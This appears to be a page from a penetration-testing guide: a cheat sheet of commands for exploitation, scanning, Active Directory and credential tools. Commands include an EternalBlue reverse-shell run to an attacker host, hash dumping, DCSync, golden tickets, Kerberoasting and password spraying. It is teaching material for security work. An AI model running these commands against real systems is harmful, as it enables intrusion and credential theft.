# Exploiting Vulnerabilities

This section covers tools for discovering, researching, and exploiting known vulnerabilities in systems and applications.

<br>

## Tools Reference Table

<p align="center">

| Tool | Category | Purpose | Link |
|:-----|:---------|:--------|:-----|
| [**Metasploit**](#metasploit-framework) | Exploitation | Exploitation framework | [metasploit.com](https://www.metasploit.com/) |
| [**SearchSploit**](#searchsploit) | Research | Offline Exploit-DB search | [exploit-db.com](https://www.exploit-db.com/) |
| [**Exploit-DB**](#exploit-db) | Research | Public exploit database | [exploit-db.com](https://www.exploit-db.com/) |
| [**CVE Search**](#cve-search) | Research | CVE database search | [cve.mitre.org](https://cve.mitre.org/) |
| [**Nuclei**](#nuclei) | Scanner | Template-based vuln scanner | [GitHub](https://github.com/projectdiscovery/nuclei) |
| [**Nessus**](#nessus) | Scanner | Commercial vuln scanner | [tenable.com](https://www.tenable.com/products/nessus) |
| [**OpenVAS**](#openvas) | Scanner | Open-source vuln scanner | [openvas.org](https://www.openvas.org/) |
| [**Nmap NSE**](#nmap-nse-scripts) | Scanner | Nmap vulnerability scripts | [nmap.org](https://nmap.org/) |
| [**CrackMapExec**](#crackmapexec) | Network | AD/SMB exploitation | [GitHub](https://github.com/byt3bl33d3r/CrackMapExec) |
| [**NetExec**](#netexec) | Network | CrackMapExec successor | [GitHub](https://github.com/Pennyw0rth/NetExec) |
| [**Impacket**](#impacket) | Network | Network protocol attacks | [GitHub](https://github.com/fortra/impacket) |
| [**Responder**](#responder) | Network | LLMNR/NBT-NS poisoner | [GitHub](https://github.com/lgandx/Responder) |
| [**BloodHound**](#bloodhound) | AD | Active Directory mapping | [GitHub](https://github.com/BloodHoundAD/BloodHound) |
| [**Mimikatz**](#mimikatz) | Credentials | Windows credential extraction | [GitHub](https://github.com/gentilkiwi/mimikatz) |
| [**Rubeus**](#rubeus) | AD | Kerberos abuse toolkit | [GitHub](https://github.com/GhostPack/Rubeus) |

</p>

<br>

---

<br>

# Vulnerability Research

<br>

## SearchSploit
> *Part of Exploit-DB: https://www.exploit-db.com/*

Command-line search tool for Exploit-DB - works offline.

```bash
# Basic search
searchsploit <search_term>

# Search for specific product and version
searchsploit apache 2.4
searchsploit windows smb

# Exact match
searchsploit -e "Apache 2.4.49"

# Exclude terms
searchsploit apache --exclude="Denial of Service"

# Show full path
searchsploit -p <EXPLOIT_ID>

# Copy exploit to current directory
searchsploit -m <EXPLOIT_ID>
searchsploit -m 50383

# View exploit
searchsploit -x <EXPLOIT_ID>

# Update database
searchsploit -u
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-e` | Exact match |
| `-p` | Show full path to exploit |
| `-m` | Copy exploit to current directory |
| `-x` | View exploit content |
| `-u` | Update database |
| `--exclude` | Exclude terms |
| `-t` | Search in title only |
| `-w` | Show URLs instead of local path |
| `--nmap` | Parse nmap XML output |

</p>

**Example Workflow:**

```bash
# Search for vulnerability
searchsploit vsftpd 2.3.4

# Copy exploit
searchsploit -m unix/remote/17491.rb

# Or view the path
searchsploit -p 17491
```

<br>

## Exploit-DB
> *Website: https://www.exploit-db.com/*

Online database of public exploits and vulnerable software.

**Search Operators:**

<p align="center">

| Filter | Description |
|:-------|:------------|
| `type:` | Filter by type (webapps, remote, local, dos) |
| `platform:` | Filter by platform (windows, linux, php) |
| `author:` | Filter by author |
| `port:` | Filter by port |

</p>

**Related Resources:**
- **Google Hacking DB**: https://www.exploit-db.com/google-hacking-database
- **Papers**: https://www.exploit-db.com/papers
- **Shellcodes**: https://www.exploit-db.com/shellcodes

<br>

## CVE Search
> *Website: https://cve.mitre.org/*

Research CVE (Common Vulnerabilities and Exposures) identifiers.

**Useful CVE Resources:**

<p align="center">

| Resource | URL |
|:---------|:----|
| MITRE CVE | https://cve.mitre.org/ |
| NVD (NIST) | https://nvd.nist.gov/ |
| CVE Details | https://www.cvedetails.com/ |
| VulnDB | https://vuldb.com/ |
| Snyk Vuln DB | https://snyk.io/vuln/ |

</p>

**CLI Tools:**

```bash
# cve-search (local database)
pip install cve-search
cve-search -c CVE-2021-44228

# Using curl with NVD API
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"
```

<br>

---

<br>

# Exploitation Frameworks

<br>

## Metasploit Framework
> *Website: https://www.metasploit.com/*

Industry-standard penetration testing framework.

### Starting Metasploit

```bash
# Start database
sudo systemctl start postgresql
sudo msfdb init

# Launch console
msfconsole

# Quick launch with resource file
msfconsole -r commands.rc
```

### Basic Commands

```bash
# Search for exploits
search <term>
search type:exploit platform:windows smb
search cve:2017-0144

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit
run

# Background session
background
sessions -l
sessions -i <ID>
```

<p align="center">

| Command | Description |
|:--------|:------------|
| `search` | Search modules |
| `use` | Select module |
| `info` | Show module info |
| `show options` | Show required options |
| `set` | Set option value |
| `setg` | Set global option |
| `exploit` / `run` | Execute module |
| `back` | Exit current module |
| `sessions` | Manage sessions |

</p>

### Common Exploits

<p align="center">

| Exploit | Target | CVE |
|:--------|:-------|:----|
| `exploit/windows/smb/ms17_010_eternalblue` | Windows SMB | CVE-2017-0144 |
| `exploit/windows/smb/ms08_067_netapi` | Windows SMB | CVE-2008-4250 |
| `exploit/unix/ftp/vsftpd_234_backdoor` | vsftpd 2.3.4 | CVE-2011-2523 |
| `exploit/multi/http/tomcat_mgr_upload` | Apache Tomcat | - |
| `exploit/unix/webapp/drupal_drupalgeddon2` | Drupal | CVE-2018-7600 |
| `exploit/multi/http/jenkins_script_console` | Jenkins | - |
| `exploit/windows/http/rejetto_hfs_exec` | Rejetto HFS | CVE-2014-6287 |
| `exploit/linux/http/apache_mod_cgi_bash_env_exec` | Shellshock | CVE-2014-6271 |

</p>

### Auxiliary Modules

```bash
# SMB enumeration
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares

# Port scanning
use auxiliary/scanner/portscan/tcp

# Service enumeration
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ssh/ssh_version
```

<br>

---

<br>

# Vulnerability Scanners

<br>

## Nuclei
> *GitHub: https://github.com/projectdiscovery/nuclei*

Fast, template-based vulnerability scanner.

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Basic scan
nuclei -u https://target.com

# Multiple targets
nuclei -l urls.txt

# Specific templates
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t vulnerabilities/

# Filter by severity
nuclei -u https://target.com -s critical,high

# Filter by tags
nuclei -u https://target.com -tags cve,rce,sqli

# Update templates
nuclei -ut

# Output to file
nuclei -u https://target.com -o results.txt
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-u` | Target URL |
| `-l` | List of targets |
| `-t` | Template path |
| `-s` | Severity filter (info, low, medium, high, critical) |
| `-tags` | Filter by tags |
| `-et` | Exclude templates |
| `-rl` | Rate limit |
| `-c` | Concurrency |
| `-o` | Output file |
| `-ut` | Update templates |

</p>

<br>

## Nmap NSE Scripts
> *Website: https://nmap.org/nsedoc/*

Nmap Scripting Engine for vulnerability detection.

```bash
# Run default scripts
nmap -sC <TARGET>

# Run vulnerability scripts
nmap --script vuln <TARGET>

# Specific vulnerability scripts
nmap --script smb-vuln* <TARGET>
nmap --script http-vuln* <TARGET>

# Safe scripts only
nmap --script "safe and vuln" <TARGET>

# Script with arguments
nmap --script http-enum --script-args http-enum.basepath='/admin/' <TARGET>

# Update script database
nmap --script-updatedb
```

**Common Vulnerability Scripts:**

<p align="center">

| Script | Description |
|:-------|:------------|
| `smb-vuln-ms17-010` | EternalBlue check |
| `smb-vuln-ms08-067` | Conficker vulnerability |
| `http-vuln-cve2017-5638` | Apache Struts RCE |
| `http-shellshock` | Shellshock vulnerability |
| `ssl-heartbleed` | Heartbleed vulnerability |
| `http-sql-injection` | SQL injection detection |
| `ftp-vsftpd-backdoor` | vsftpd 2.3.4 backdoor |

</p>

```bash
# Example: Check for EternalBlue
nmap -p445 --script smb-vuln-ms17-010 <TARGET>

# Example: Check for Heartbleed
nmap -p443 --script ssl-heartbleed <TARGET>
```

<br>

## Nessus
> *Website: https://www.tenable.com/products/nessus*

Commercial vulnerability scanner (free version available).

```bash
# Start Nessus service
sudo systemctl start nessusd

# Access web interface
# https://localhost:8834
```

**Scan Types:**
- **Basic Network Scan** - General vulnerability assessment
- **Advanced Scan** - Customizable scan options
- **Web Application Tests** - OWASP Top 10
- **Credentialed Scan** - Authenticated scanning

<br>

## OpenVAS
> *Website: https://www.openvas.org/*

Open-source vulnerability scanner (part of Greenbone).

```bash
# Install on Kali
sudo apt install openvas
sudo gvm-setup

# Start services
sudo gvm-start

# Access web interface
# https://localhost:9392
# Default: admin / (generated password)
```

<br>

---

<br>

# Network Exploitation

<br>

## CrackMapExec
> *GitHub: https://github.com/byt3bl33d3r/CrackMapExec*

Swiss army knife for pentesting Windows/Active Directory environments.

```bash
# SMB - Check access
crackmapexec smb <TARGET> -u <USER> -p <PASS>

# SMB - Enumerate shares
crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares

# SMB - Enumerate users
crackmapexec smb <TARGET> -u <USER> -p <PASS> --users

# SMB - Pass the hash
crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>

# SMB - Execute command
crackmapexec smb <TARGET> -u <USER> -p <PASS> -x "whoami"

# SMB - Dump SAM
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam

# SMB - Dump LSA
crackmapexec smb <TARGET> -u <USER> -p <PASS> --lsa

# WinRM
crackmapexec winrm <TARGET> -u <USER> -p <PASS>

# LDAP - Enumerate
crackmapexec ldap <TARGET> -u <USER> -p <PASS> --users
```

<p align="center">

| Protocol | Description |
|:---------|:------------|
| `smb` | SMB protocol |
| `winrm` | Windows Remote Management |
| `ldap` | LDAP queries |
| `mssql` | MS SQL Server |
| `ssh` | SSH protocol |
| `rdp` | Remote Desktop |

</p>

<br>

## NetExec
> *GitHub: https://github.com/Pennyw0rth/NetExec*

CrackMapExec successor with continued development.

```bash
# Same syntax as CrackMapExec
netexec smb <TARGET> -u <USER> -p <PASS>
netexec smb <TARGET> -u <USER> -p <PASS> --shares
netexec smb <TARGET> -u <USER> -H <HASH> --sam

# Spray passwords
netexec smb <TARGETS> -u users.txt -p passwords.txt --continue-on-success
```

<br>

## Impacket
> *GitHub: https://github.com/fortra/impacket*

Collection of Python classes for working with network protocols.

### Installation

```bash
pip install impacket
# Or clone for scripts
git clone https://github.com/fortra/impacket.git
cd impacket/examples
```

### Common Scripts

```bash
# PSExec - Remote command execution
psexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>
psexec.py -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET>

# WMIExec - WMI command execution
wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>

# SMBExec - SMB command execution
smbexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>

# SecretsDump - Dump credentials
secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET>
secretsdump.py -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET>

# GetNPUsers - AS-REP Roasting
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>

# GetUserSPNs - Kerberoasting
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request

# SMBClient
smbclient.py <DOMAIN>/<USER>:<PASS>@<TARGET>

# MSSQL Client
mssqlclient.py <DOMAIN>/<USER>:<PASS>@<TARGET> -windows-auth
```

<p align="center">

| Script | Purpose |
|:-------|:--------|
| `psexec.py` | Remote command execution via SMB |
| `wmiexec.py` | Command execution via WMI |
| `smbexec.py` | Command execution via SMB |
| `atexec.py` | Command execution via Task Scheduler |
| `dcomexec.py` | Command execution via DCOM |
| `secretsdump.py` | Dump SAM/LSA/NTDS secrets |
| `GetNPUsers.py` | AS-REP Roasting |
| `GetUserSPNs.py` | Kerberoasting |
| `ticketer.py` | Create Golden/Silver tickets |
| `ntlmrelayx.py` | NTLM relay attacks |

</p>

<br>

## Responder
> *GitHub: https://github.com/lgandx/Responder*

LLMNR, NBT-NS, and MDNS poisoner for credential capture.

```bash
# Basic usage
sudo responder -I eth0

# With WPAD proxy
sudo responder -I eth0 -wrf

# Analyze mode (passive)
sudo responder -I eth0 -A

# Force WPAD authentication
sudo responder -I eth0 -wFb
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-I` | Interface |
| `-w` | Start WPAD rogue proxy |
| `-r` | Enable NetBIOS wredir |
| `-f` | Fingerprint hosts |
| `-A` | Analyze mode (passive) |
| `-F` | Force WPAD auth |
| `-b` | HTTP Basic auth |

</p>

**Captured hashes location:** `/usr/share/responder/logs/`

**Crack captured hashes:**
```bash
hashcat -m 5600 hash.txt wordlist.txt  # NTLMv2
hashcat -m 5500 hash.txt wordlist.txt  # NTLMv1
```

<br>

---

<br>

# Active Directory Attacks

<br>

## BloodHound
> *GitHub: https://github.com/BloodHoundAD/BloodHound*

Active Directory reconnaissance and attack path mapping.

### Setup

```bash
# Install Neo4j
sudo apt install neo4j
sudo neo4j console

# Install BloodHound
sudo apt install bloodhound
bloodhound
```

### Data Collection (SharpHound)

```powershell
# PowerShell collector
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Executable
.\SharpHound.exe -c All

# From Linux (bloodhound-python)
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc <DC> -c All
```

<p align="center">

| Collection Method | Description |
|:------------------|:------------|
| `All` | All collection methods |
| `Default` | Group membership, sessions, ACLs |
| `DCOnly` | Only from Domain Controller |
| `Session` | Session information |
| `ACL` | ACL data |
| `Trusts` | Domain trusts |

</p>

### Useful Queries

- **Find all Domain Admins**
- **Shortest path to Domain Admin**
- **Kerberoastable accounts**
- **AS-REP Roastable accounts**
- **Computers with unconstrained delegation**

<br>

## Mimikatz
> *GitHub: https://github.com/gentilkiwi/mimikatz*

Windows credential extraction tool.

```powershell
# Run Mimikatz
mimikatz.exe

# Get debug privilege
privilege::debug

# Dump credentials from memory
sekurlsa::logonpasswords

# Dump SAM database
lsadump::sam

# Dump cached credentials
lsadump::cache

# DCSync attack
lsadump::dcsync /user:Administrator

# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<HASH>

# Golden ticket
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt

# Silver ticket
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /target:<TARGET> /service:<SERVICE> /rc4:<HASH> /ptt
```

<p align="center">

| Command | Description |
|:--------|:------------|
| `sekurlsa::logonpasswords` | Dump plaintext passwords |
| `sekurlsa::tickets` | List Kerberos tickets |
| `sekurlsa::pth` | Pass-the-hash |
| `lsadump::sam` | Dump SAM database |
| `lsadump::dcsync` | DCSync attack |
| `kerberos::golden` | Create Golden/Silver ticket |
| `kerberos::ptt` | Pass-the-ticket |

</p>

<br>

## Rubeus
> *GitHub: https://github.com/GhostPack/Rubeus*

Kerberos abuse toolkit.

```powershell
# Kerberoasting
Rubeus.exe kerberoast

# Kerberoast specific user
Rubeus.exe kerberoast /user:<USER>

# AS-REP Roasting
Rubeus.exe asreproast

# Request TGT
Rubeus.exe asktgt /user:<USER> /password:<PASS>

# Request TGT with hash
Rubeus.exe asktgt /user:<USER> /rc4:<HASH>

# Pass-the-ticket
Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Overpass-the-hash
Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /ptt

# Dump tickets
Rubeus.exe dump

# Monitor for new tickets
Rubeus.exe monitor /interval:5
```

<p align="center">

| Command | Description |
|:--------|:------------|
| `kerberoast` | Kerberoasting attack |
| `asreproast` | AS-REP Roasting attack |
| `asktgt` | Request TGT |
| `asktgs` | Request TGS |
| `ptt` | Pass-the-ticket |
| `dump` | Dump tickets |
| `harvest` | Harvest tickets |
| `s4u` | S4U constrained delegation |

</p>

<br>

---

<br>

# Quick Reference - Common Vulnerabilities

## Critical CVEs

<p align="center">

| CVE | Name | Target | Impact |
|:----|:-----|:-------|:-------|
| CVE-2017-0144 | EternalBlue | Windows SMB | RCE |
| CVE-2021-44228 | Log4Shell | Log4j | RCE |
| CVE-2021-34473 | ProxyShell | Exchange | RCE |
| CVE-2021-1675 | PrintNightmare | Windows Print Spooler | RCE/LPE |
| CVE-2020-1472 | ZeroLogon | AD Netlogon | Privilege Escalation |
| CVE-2019-0708 | BlueKeep | Windows RDP | RCE |
| CVE-2014-6271 | Shellshock | Bash | RCE |
| CVE-2014-0160 | Heartbleed | OpenSSL | Info Disclosure |

</p>

## Service-Specific Checks

```bash
# SMB
nmap --script smb-vuln* -p445 <TARGET>

# HTTP/HTTPS
nmap --script http-vuln* -p80,443 <TARGET>

# FTP
nmap --script ftp-vuln* -p21 <TARGET>

# SSH
nmap --script ssh-auth-methods -p22 <TARGET>

# SSL/TLS
nmap --script ssl-* -p443 <TARGET>
```

<br>

---

## Useful Resources

- **Exploit-DB**: https://www.exploit-db.com/
- **CVE Details**: https://www.cvedetails.com/
- **NVD**: https://nvd.nist.gov/
- **Packet Storm**: https://packetstormsecurity.com/
- **Rapid7 Vuln DB**: https://www.rapid7.com/db/
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings


<br>

---

<br>
<br>

<div align="center">

| Previous Page | Next Page |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>
